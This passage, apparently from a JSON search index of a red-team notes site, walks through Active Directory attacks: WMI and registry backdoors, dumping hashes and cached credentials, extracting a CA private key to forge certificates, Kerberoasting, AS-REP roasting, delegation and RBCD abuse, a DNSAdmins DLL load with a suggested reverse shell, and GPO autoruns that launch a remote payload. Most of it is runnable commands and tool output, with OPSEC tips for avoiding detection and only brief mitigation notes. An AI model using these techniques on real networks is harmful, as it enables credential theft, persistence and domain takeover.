SACL. ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid ACE for built-in administrators for WMI namespaces A;CI;CCDCLCSWRPWPRCWD;;;&lt;SID&gt; WMI ACLs can be modified to allow non-admin users access to securable objects with Set-RemoteWMI.ps1: Import-Module .\\Set-RemoteWMI.ps1 Set-RemoteWMI -UserName user1 -Verbose Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\\cimv2' -Verbose Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -Credential Administrator -namespace 'root\\cimv2' -Verbose And to remove permissions: Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\\cimv2' -Remove -Verbose PowerShell Remoting Something similar we can do it with PowerShell Remoting with the script Set-RemotePSRemoting.ps1. Import-Module .\\Set-RemotePSRemoting.ps1 Set-RemotePSRemoting -UserName user1 -Verbose Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove Remote Registry Backdoor Using DAMP we can modify the registry with administrative privileges. On a remote machine with Add-RemoteRegBackdoor.ps1 script. https: github.com HarmJ0y DAMP Import-Module .\\DAMP-master\\Add-RemoteRegBackdoor.ps1 Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose After that we can execute some interesting attacks such as getting accounts and machines hashes. Retrive machine account hash: Import-Module .\\DAMP-master\\Get-RemoteMachineAccountHash Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose Retrieve local account hash: Import-Module .\\DAMP-master\\Get-RemoteLocalAccountHash Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose Retrive domain cached credentials: Import-Module .\\DAMP-master\\Get-RemoteCachedCredentials Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose Forged Certificates Sometimes AD CS roles are installed on separate servers and not on the DC themselves. And often, they are no treated with the same sensitivity as DCs. Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate. With SharpDPAPI we can extract the private keys. https: github.com GhostPack SharpDPAPI Run the following command on a Domain Controller: .\\SharpDPAPI.exe certificates machine The private CA key has the Issuer and Subject, both the distinguished name of the CA. File : b2ddcffdd2d1598108758953e4e0356b_d0c48e6a-1237-4eca-bb8c-9b22df87997d Provider GUID : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} Master Key GUID : {c153dc41-b91b-4ca3-8196-0cf72bdbf7c0} Description : Private Key algCrypt : CALG_AES_256 (keyLen 256) algHash : CALG_SHA_512 (32782) Salt : 5ea093f4e1b8c9415d080cecc3acd145b63fc9420074d51ff7998a361fd5ec24 HMAC : a2d1fee192cd5ab1e4304e87d8d31267d83a98290c9e08db513bcd7214b8f09b Unique Name : sub-ca Thumbprint : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E Issuer : CN=ca, DC=corp, DC=local Subject : CN=sub-ca, DC=dev, DC=corp, DC=local Valid Date : 8 15 2022 4:06:13 PM Expiry Date : 8 15 2024 4:16:13 PM [*] Private key file b2ddcffdd2d1598108758953e4e0356b_d0c48e6a-1237-4eca-bb8c-9b22df87997d was recovered: -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAy1qdXLFZUIIEnDQ4g2Lh3fmppE6h0+Lql tRlUZH41qazAeI mezAMzphbzZxQeJP4MBSyqi21mhFt6sC48E5A0zlUbQduADsdQU7Ty6Zr9FzYva2 MP zhgnmMSUEKoEA5p9bk6WcSdxixJMfmeSdFQiTDZ Save the private key into a .pem file and then convert it to .pfx with opeenssl. $ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx Enter Export Password: Verifying - Enter Export Password: Note It is recommended to enter a password. Convert cert.pfx into base64. cat cert.pfx | base64 -w 0 Finally forge a certificate with ForgeCert. https: github.com GhostPack ForgeCert .\\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@corp.local\" --NewCertPath fake.pfx --NewCertPassword \"password\" Note: We need to specify in SubjectAltName a existant user in the domain. With the cerficiate we can ask a TGT. .\\Rubeus asktgt user:Administrator certificate:&lt;B64-CERT&gt; password:password nowrap"
					}

					
				
			
		
			
				
					,
					

					"active-directory-domain-privesc": {
						"id": "active-directory-domain-privesc",
						"title": "Domain Privilege Escalation",
						"category": "",
						"url": " /active-directory/domain-privesc/",
						"content": "Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller. Attacking Kerberos Kerberoasting The Kerberos session ticket as known as TGS has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack. Note: Service accounts are many times ignored. Password are rarely changed and have privileged access. OPSEC Note: Thousands of tickets are requests, is too hard of being detected. Since some fake SPN (honeypot) can be available, never get all the Kerberos tickets automatically and search for some specifically. Getting the TGS First of all we need to find which users are used as Service Accounts: PowerView: Get-NetUser -SPN PowerView (dev): Get-DomainUser -SPN ADModule: Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName ADSearch: .\\ADSearch.exe --search \"(&amp;(sAMAccountType=805306368)(servicePrincipalName=*))\" After enum it, we need to request a TGS: PowerView: Get-NetUser -SPN | Request-SPNTicket ADModule: Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc mgmt-user.corp.local\" Note: With klist you can check if the TGS has been granted. Finally all tickets should be exported. Inovoke-Mimikatz -Command '\"kerberos::list export\"' Rubeus PS C:\\Windows\\Temp\\Rubeus\\&gt;.\\Rubeus.exe kerberoast outfile:hashes.kerberoast ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ | | | | _ \\| ___ | | | | ___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____ |____ |_____)____ (___ v1.5.0 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use ticket:X or tgtdeleg to force RC4_HMAC for these accounts. [*] Searching the current domain for Kerberoastable users [*] Total kerberoastable users : 2 [*] SamAccountName : websvc [*] DistinguishedName : CN=websvc,CN=Users,DC=corp,DC=local [*] ServicePrincipalName : SNMP adminsrv.corp.LOCAL [*] PwdLastSet : 2 17 2019 1:01:06 PM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash written to C:\\Windows\\Temp\\Rubeus\\hashes.kerberoast [*] SamAccountName : svcadmin [*] DistinguishedName : CN=svcadmin,CN=UsersDC=corp,DC=local [*] ServicePrincipalName : MSSQLSvc mgmt.corp.local:1433 [*] PwdLastSet : 2 17 2019 2:22:50 PM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash written to C:\\Windows\\Temp\\Rubeus\\hashes.kerberoast [*] Roasted hashes written to : C:\\Windows\\Temp\\Rubeus\\hashes.kerberoast You can also specify a user: .\\Rubeus.exe kerberoast user:svcadmin outfile:hashes.kerberoast Cracking the tickets Once the tickets are exported it can be cracked with john, hashcat or tgsrepcrack.py tool: python.exe .\\tgsrepcrack.py wordlist.txt ticket.kirbi To crack the ticket with hascat exists a script to export it to a hashcat format. https: github.com jarilaos kirbi2hashcat haschat -a 0 -m 13100 ticket.txt wordlist.txt Mitigation Since a lot of tickets are requested, we can see the logs in order to find all the kerberos tickets requests: Security Event ID 4769: A Kerberos ticket was requested Get-WmiEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Mesage.split(\"`n\")[8] -ne 'krbtgt' -and $_.Message.split(\"`n\")[8] -ne '*$' -and $_.Message.split(\"`n\")[3] -notlike '*$@*' -and $_.Message.split(\"`n\")[18] -like '*0x0*' -and $_.Message.split(\"`n\")[17] -like '*0x17*'} | select - ExpandProperty message To prevent from kerberoasting attacks we have the following recommendations: Service Account Passwords should be hard to guess (greater than 25 characteres) Use Managed Service ACcounts (Automatic change of password periodically and deltegated SPN Management) Try to not run a service as a Domain Admin account. AS-REP Roasting If a users account does not have the flag “Do not require Kerberos pre-authentication” in UserAccountControl settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline. This configuration is also enabled on the User Object and is often seen on accounts that are used on Linux Systems. OPSEC Notes: Same as Kerberoasting don’t run asreproast by itself as this will roast every account in the domain with pre-authentication not set. Users with No-Preauth set We need to enumerate accounts with Kerberos Preauth disabled: PowerView (dev): Get-DomainUser -PreauthNotRequired -Verbose ADModule: Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth ADSearch: .\\ADSearch.exe --search \"(&amp;(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname Requesting a ticket With Rubeus we can request a ASREP ticket. .\\Rubeus.exe asreproast user:asrepuser nowrap Cracking the tickets We can request an encrypted AS-REP for offline brute-force. To do that task we can use ASREPRoast module: Import-Module ASREPRoast.ps1 Get-ASREPHash -UserName user01 -Verbose After getting the ticket we can crack it with john or hashcat: john user01.ticket --wordlist=wordlist.txt hashcat -a 0 -m 18200 user01.ticket wordlist.txt Kerberos Delegation Kerberos Delegation allows to reuse the end-user credentials to access resources hosted on a different server. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources on the database server as the user and not as the web server’s service account. Note: The service account for web service must be trusted for delegation to be able to make requests as a user. So the server can Impersonate the user. There are two types of delegation: Unconstrained Delegation When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user. When unconstrained delegation is enabled, the domain controller places uset’s TGT inside TGS. When that is presented to the server with unconstrained delegation, the TGT is extracted from TGS and sotred in LSASS. This way the server can reuse the user’s TGT to access any other resource as the user. Note: Allows the first hop server to request access to any service on any computer in the domain. We need to discover computers which have unconstrained delegation enabled. PowerView: Get-NetComputer -UnConstrained ADModule: Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True} ADSearch: C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname,operatingsystem Note: The DC always have the unconstrained delegation enabled. To exploit the unconstrained delgation and extract the user’s TGT from lsass, we need to compromise the server as local admin. Invoke-Mimikatz Invoke-Mimikatz -Command '\"sekurlsa::tickets export\"' Rubeus With Rubeus we can list the tickets. .\\Rubeus.exe triage And we can download one specifing the LUID and Service: .\\Rubeus.exe dump luid:0x3e8 service:krbtgt nowrap If any interesting ticket is located on the server, we will need to wait until a interesting user connects to the compromised server. We can use Invoke-UserHunter to see if the targeted user connects to the server: Invoke-UserHunter -ComputerName srv01 -Poll 100 -UserName Administrator -Delay 5 -Verbose If we find a interesting ticket, it could be reused using Pass-The-Ticket: Invoke-Mimikatz -Command '\"kerberos::ptt ticket.kirbi\"' Printer Bug We can abuse the printer bug if we don’t want to wait for a Domain Admin to connect to the server where Unconstrained Delegation is enabled. We can start listenting for new tickets with Rubeus on the server which have Unconstrained Delegation enabled. .\\Rubeus.exe monitor inverval:5 nowrap [ targetuser:admin] With the printer bug we can force the Domain Controller to connect to any server. https: github.com leechristensen SpoolSample .\\MS-RPRN.exe \\\\dc01.corp.local \\\\udeleg.corp.local On the listener we will receive a Ticket TGT from the DC machine account DC01$: [*] 6 10 2022 4:29:53 PM UTC - Found new TGT: User : DC01$@CORP.LOCAL StartTime : 6 10 2022 6:32:58 AM EndTime : 6 10 2022 4:32:57 PM RenewTill : 6 16 2022 9:01:51 PM Flags : name_canonicalize, pre_authent, renewable, forwarded, forwardable Base64EncodedTicket : doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgzdiOtwS+cAcLOZJMO+dPDVk+nVz8Gl6X7LNl+FVx8GU29naNwzNLEm6+GtbrKbuu+5 cmP3SPGeRZZPcggT7rM9aYzrIpn2xZadXN5SviKI47opFETnalXeuoIco LjoYVzAsAjFrpZ0cXUgVXMJyT X2YL0qDAQHNArzenfXiMd+Yzy2xPdjiPteusMzbkWx7gz92mWtV+JFHSocAsbVCTtkl8BXVuT67I55U9tGit5+TAtfg+CfBUZlLNfZaMtPjDs8hyinR2qyo2 NaiROyzyUFUhOZaHjhdX9G3zFDKvCPVXx0aiWPmHotGfR2HhAjy281DqX57xpA4vl TvksgYj0nTz1S3JLhZyKfJfJbpoLDXLsNipSN6lypcxGdKwTyGQrxKT+ftDlI1ui08WBR1YSDCJCRa6u5JczvHO2bHLOTxn7Dpi7TUrBNVyxs5fYXaBA4nMf1J8luJQRp22bTBpXrgH8zd9cNTmTb 9q0bNCiWV16cEYnDTWxua7APwY4qSwVZWA 6ZSbwChQAq2g7m6tDls9v60oiMZRx957xAFeOfhoL1eEcEcO8z7CL9c4KpZBteWSNWuk 4kHCFREHDFGKRPtWV4kPMEty9d9Mk28xwj3njdoNVQvo1K7JZHNamZukSH2oty3uX6cvWe4T gT6dEz1dzr0ENsWCwtTEGumxligGyWTcxyJdFj4Aul6aeRumiewJvS6GRZxlqln7gCL3Rw4NlN6vMMzSJsvpW KbS1wtJlP5FgpUYmfZupMx1R3hEKoVpDiAOX0HqK7 tXmn +zMJeajLscOCll6FCPP lysRwn6HHSNjD8rjh3Ylw9hqpZv Aqm+nvc9SUkkOqsJH2XfI3TmxmzViweZ vdyK HeTwfaEsTpyFtarsz8uutVSyK9VzepzU PoTOc SmpHo1BUhvsCUQjA0njFslQ0loLJydoXkXaWRcfbGWET jQa3cNHPoK3jg5VY4njENzp7D59Nt7a s2Lrj8xe3365z7YDOFxIaTUQGWUC0qr9XOQ+EDDc80 CcYyDrUN79Z7wqbbl 7BkzTtqd1wbVgSYTVhiWmnLALvBBXcPqazZv7DN8FlfDwDau6plwiKZlSjKJN7ecJwgy5xf5HixsuLO9Sm+bfjuElCjhVvklyrt6oZ G7vm+KqhJA7SAk 9fnHlWbV4Eon8XPqt pirKgdP Rv6dPECw7ybwTpytHJh1Wqp7456opEFZGYq8mOWCFsirMRU+G7EWNUVr3AxN1sbcwFUdb4mVql4onFCMgRIv6F4UkCKRNej5lG6SLfRCCxg85dytrWVRYs7GO8I968dFtoxAI a4WjjPeA0y1J1zrc5aMeYhOD5XHx4XMkz7+Kd0FLNSmreNhQsHtkx4WIaqTg6 0qIgvlo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB aCB+jCB9zCB9KArMCmgAwIBEqEiBCAfSXFmixqxdagZDdk9m0Rp5BX7xWnwbLflr8znMe5aCqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDYxMDEzMzI1OFqmERgPMjAyMjA2MTAyMzMyNTdapxEYDzIwMjIwNjE3MDQwMTUxWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw= Finally we can import it with Rubeus, execute a Pass-The-Ticket and do a DCSync Attack to retrieve Administrator NTLM hash. .\\Rubeus.exe ptt ticket:&lt;b64ticket&gt; Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\Administrator\"' Constrained Delegation When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user. A typical scenario where constrained delegation is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user’s authorization. Note: Allows the first hop server to request access only to specified services on specified computers. To impersonate the user, Service for user as known as S4U extension is used and will make two requests: Service for User to Self (S4U2self): Allows a service to obtain a forwardable TGS to itself on behalf a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION (T2A4D UserAccountControl attribute). Service for User to Proxy (S4U2proxy): Allows a service to obtain a TGS to a second service on behalf of a user. The attribute msDS-AllowedToDelegate attribute contains a list of SPNs to which the user tokens can be forwarded. To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services of the systemss listed in msDS-AllowedToDelegateTo as any user. PowerView Dev: Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth ADModule: Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo ADSearch: C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json First we need the TGT of the principal (machine or user) which is trusted for delegation. There are two main methods, we can extract it directly from memory or request one using NTLM or AES Keys. Abusing Constrained Delegation Extracting TGT from memory We can extract the TGT from memory with Rubeus dump module. With triage module we can list the TGTs. Rubeus.exe triage --------------------------------------------------------------------------------------------------------------- | LUID | UserName | Service | EndTime | --------------------------------------------------------------------------------------------------------------- | 0x3e4 | srv-2$ @ DEV.CORP.LOCAL | krbtgt DEV.CORP.LOCAL | 12 5 2021 8:06:05 AM | | [...snip...] | --------------------------------------------------------------------------------------------------------------- And finally we can dump specifying the LUID. .\\Rubeus.exe dump luid:0x3e4 service:krbtgt nowrap Request a new TGT with NTLM or AES Keys We can Request a TGT with different tools. kekeo: We can use asktgt from kekeo to request a TGT. .\\kekeo.exe kekeo # tgt::ask user:websvC domain:dollarcorp.moneycorp.local rc4:cc098f204c5887eaa8253e7c2749156f Rubeus: .\\Rubeus.exe asktgt user:websvC rc4:cc098f204c5887eaa8253e7c2749156f opsec nowrap .\\Rubeus.exe asktgt user:websvC aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 opsec nowrap S4U Request Once we have the TGT, we can request TGS with a S4U request. kekeo: kekeo # tgs::s4u tgt:TGT_websvC@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi user:Administrator@dollarcorp.moneycorp.local service:cifs dcorp-mssql.dollarcorp.moneycorp.local|host dcorp-mssql.dollarcorp.moneycorp.local Rubeus: .\\Rubeus.exe s4u user:DCORP-ADMINSRV$ rc4:5e77978a734e3a7f3895fb0fdbda3b96 [ aes256:XXXX] impersonateuser:Administrator msdsspn:\"TIME dcorp-dc.dollarcorp.moneycorp.local\" altservice:LDAP ticket:[b64-ticket] Note: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified. Inject TGS Finally with mimikatz we can inject the ticket on the current session: .\\Rubeus.exe ptt ticket:TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_host~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi It is also possible to create a process with that Tiket in order to impersonate or steal the token with CobaltStrike. .\\Rubeus.exe createnetonly program:C:\\Windows\\System32\\cmd.exe \\domain:DEV username:Administrator password:FakePass ticket&lt;base64&gt; Note: If we have Constrained delegation on the DC we can ask to the LDAP TGS in order to do a DCSync attack. Abusing S4U2self extension Machines do not get remote local admin access to themserlver over CIFS, but we can abuse S4U2self to obtain a TGS to itself, as a user we know is a local admin If we obtain a TGT for a computer (there are different ways to obtain it without being admin for example using the Printer Bug), we can craft a TGS for CIFS using the alternative service. .\\Rubeus.exe s4u impersonateuser:Administrator self altservice:CIFS WRKSTN-1.corp.local user:WRKSTN-1$ ticket:[B64_TGT_SRKSTN-1] Finally inject the TGS in memory and access to CIFS service. ls \\\\wrkstn-1.corp.local\\c$ Note: Make sure to use FQDN. Mitigation It is recommended to: Limit DA Admin logins to specific servers. Set Account is sensitive and cannot be delegated flag for privileged accounts. Rersource-Based Constrained Delegation (RBCD) To enable constrained or unsconstrained delegation on a computer requires the SeEnableDelegationPrivilege user right assignment on domain controllers, which is only granted to enterprise and domain admins. Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source. Constrained Delegation is configured on the front-end service via the msDS-AllowedToDelegateTo attribute an example could be CIFS dc-2.corp.local was in the msDS-AllowedToDelegateTo attribute of SQL-2, which allows SQL-2 computer account to impersonate any user to any service on dc-2. RBCD reverses this concept and puts control in the hands of the backend via the new attribute called msDS-AllowedToActOnBehalfOfTheIdentity. This attribute also does not require the SeEnableDelegationPrivilege to modify. You only need a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on a computer object. Note: We are going to abuse WriteProperty, GenericAll, GenericWrite or WriteDacl rights on a computer to add RBCD delegation attribute, then perform S4U and compromise the target machine. Note: See the ObjectAceType to make sure that we have WritePoperty rights in all properties (All) PowerView (dev): Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match \"WriteProperty|GenericWrite|GenericAll|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-569305411-121244042-2357301523-[\\d]{4,10}\"} We need to use a computer account, we can use one we have compromised or we can join a fake one to the domain. To start the attack, we need it SID. PowerView (dev): Get-DomainComputer -Identity WKSTN-2 -Properties objectSid We will need to create a security descriptor with this SID: $rsd = New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)\" $rsdb = New-Object byte[] ($rsd.BinaryLength) $rsd.GetBinaryForm($rsdb, 0) And finally modify its property msDS-AllowdToActOnBehalfOfOtherIdentity. Get-DomainComputer -Identity \"dc-2\" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose One-liner command: $rsd = New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)\"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity \"dc-2\" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose Next, we can use our compromised machine account to perform S4U impersonation with Rubeus. The s4u command requires a TGT,RC4 or AES hash. Since we have elevated access to that machine account, we can extract a TGT from memory. .\\Rubeus.exe triage .\\Rubeus.exe dump luid:0x3e5 service:krbtgt nowrap Then perform the S4U. .\\Rubeus.exe s4u user:WKSTN-2$ impersonateuser:administrator msdsspn:cifs dc-2.corp.local ticket:&lt;base64ticket&gt; nowrap Finally pass the ticket into a logon session for use. Note: To clear up, remove the msDS-AllowdToActOnBehalfOfOtherIdentity entry: Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity Creating a computer object By default, every domain user can join up to 10 computers to the domain, this is specified on the ms-DS-MachineAccountQuota attribute of the domain object. Get-DomainObject -Identity \"DC=corp,DC=local\" -Properties ms-DS-MachineAccountQuota We can use StandIn to create a computer with a random password. https: github.com FuzzySecurity StandIn .\\StandIn.exe --computer FakeComputer --make [?] Using DC : dc-2.corp.local |_ Domain : corp.local |_ DN : CN=FakeComputer,CN=Computers,DC=corp,DC=local |_ Password : oIrpupAtF1YCXaw [+] Machine account added to AD.. With Rubeus we can calculate their hashes. .\\Rubeus.exe hash password:oIrpupAtF1YCXaw user:FakeComputer$ domain:corp.local Finally you can ask for a TGT. .\\Rubeus.exe asktgt user:FakeComputer$ aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 nowrap Linux Credential Cache Kerberos Credential Cache (ccache) ffiles contains the kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If we can compromise a machine, we can extract the ccache of any authenticated user and use it to request a TGS for any other service in the domain. The ccache files are stored in tmp and are prefixed with krb5cc user@linux-1:~$ ls -l tmp total 20 -rw------- 1 user domain users 1342 Mar 9 15:21 krb5cc_1234201102_MefMnG -rw------- 1 administrator domain users 1341 Mar 9 15:33 krb5cc_1234201107_NttioD Only a the user and root can read the ccache file, so we will need full access to the system. With impacket-ticketConverter we can convert the ticket from ccache to kirbi format. impacket-ticketConverter krb5cc_1234201102_MefMnG user.kirbi Finally we just need to inject it into memory. DNSAdmins It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe which is NT AUTHORITY\\SYSTEM. In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service. Note: By default does not have the privileges to restart the DNS service. Enumerate the DNSAdmins group: PowerView: Get-NetGroupMember -GroupName \"DNSAdmins\" ADModule: Get-ADGRoupMember -Identity DNSAdmins After compromise a member and from the privileges of DNSAdmins group, we can configure a dll: dnscmd.exe: dnscmd.exe dc01 config serverlevelplugindll \\\\10.10.10.10\\share\\mimilib.dll Note: If dnscmd is not available, you can install DNS Server on the Server Manager. DNSServer Module (RSAT DNS): $dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All $dnsettings.ServerLevelPluginDll = \"\\\\10.10.10.10\\share\\mimilib.dll\" Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose We need to restart the service: sc.exe \\\\dc01.corp.local stop dns sc.exe \\\\dc01.corp.local start dns By default mimilib.dll logs all DNS queries on the following file: c:\\windows\\sytem32\\kiwidns.log We can modify the source code of kdns.c from mimikatz source code in order to add a reverse shell or other type of backdoor. #pragma warning(disable:4996) if(kdns_logfile = _wfopen(L\"kiwidns.log\", L\"a\")) #pragma warning(pop) { klog(kdns_logfile, L\"%S (%hu)\\n\", pszQueryName, wQueryType); fclose(kdns_logfile); system(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==\") THIS LINE } return ERROR_SUCCESS; RedTeam Note: If we put a reverse shell on the mimilib.dll, DNS will not work properly since the reverse shell is closed. Use another way to elevate privileges such as add the user to local administrators group. Restore config After execute the attack we need to restore the previous config, so we need to remove the ServerLevelPlugin from the DNS Parameters registry. reg query \\\\dc01\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters reg delete \\\\dc01\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters v ServerLevelPluginDll sc.exe \\\\dc01 stop dns sc.exe \\\\dc01 start dns Group Policy Group Policy is the central repository in a forest or domain that controls the configuration of computers and users. Group Policy Objects (GPOs) are sets of configurations that are applied to Organisational Units (OUs). Identifying Access to GPOs By default, only Domain Admins can create GPOs and link them to OUs but it´s common practice to delegate those rights to other teams. Modifying an existing GPO This query will return any GPO in the domain, where a 4-digit RID has WriteProperty, WriteDacl or WriteOwner. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results. Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"CreateChild|WriteProperty|WriteDacl|WriteOwner\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl We can resolve the ObjectDN with: Get-DomainGPO -Name \"{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\" -Properties DisplayName Create and Link a GPO to a OU SIDs of principals that can create new GPOs (PowerView-dev) Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=corp,DC=local\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl SIDs of principals that can write to the GP-Link attribute on OUs (PowerView-dev) Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl If we can create new GPOs and link it to a OU, we can access to those servers. Remote Server Administration Tools (RSAT) RSAT is a management component provided by Microsoft to help manage components in a domain. The GroupPolicy module has several cmdlets that can be used for administering GPOs. Check if GroupPolicy is installed: Get-Module -List -Name GroupPolicy | select -expand ExportedCommands Install it by local admin: Install-WindowsFeature –Name GPMC Create a GPO and link it to a OU: New-GPO -Name \"Evil GPO\" | New-GPLink -Target \"OU=Workstations,DC=corp,DC=local\" OPSEC Alert: GPO name will be visible, try to use a name that is “convincing” If we are able to write anything, anywhere into the HKLM or HKCU hives, prsents different options for achieving code execution. The simplest way is to create a new autorun value to execute a payload on boot. Find writeable whare with PowerView Find-DomainShare -CheckShareAccess Modify the GPO: Set-GPPrefRegistryValue -Name \"Evil GPO\" -Context Computer -Action Create -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"Updater\" -Value \"C:\\Windows\\System32\\cmd.exe c \\\\srv\\share\\payload.exe\" -Type ExpandString OPSEC Alert: This leaves a Command Prompt on the screen, a better way could be %COMSPEC% b c start b min. SharpGPOAbuse SharpGPOAbuse allows a wider range of abusive configurations to be added to as GPO. It cannot create GPO, so it will must be created with the RSAT or modify one we already have write access to. Example of adding an Immediate Scheduled Task too the PowerShell Logging GPO. .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author NT AUTHORITY\\SYSTEM --Command \"%COMSPEC%\" --Arguments \" b c start b min \\\\srv\\share\\payload.exe\" --GPOName \"PowerShell Logging\" Note: We can wait to the GPO refresh or manually run gpupdate force on the target. Abusing ACLs There may be instances across the domain where some principals have ACLs on more privileged accounts, 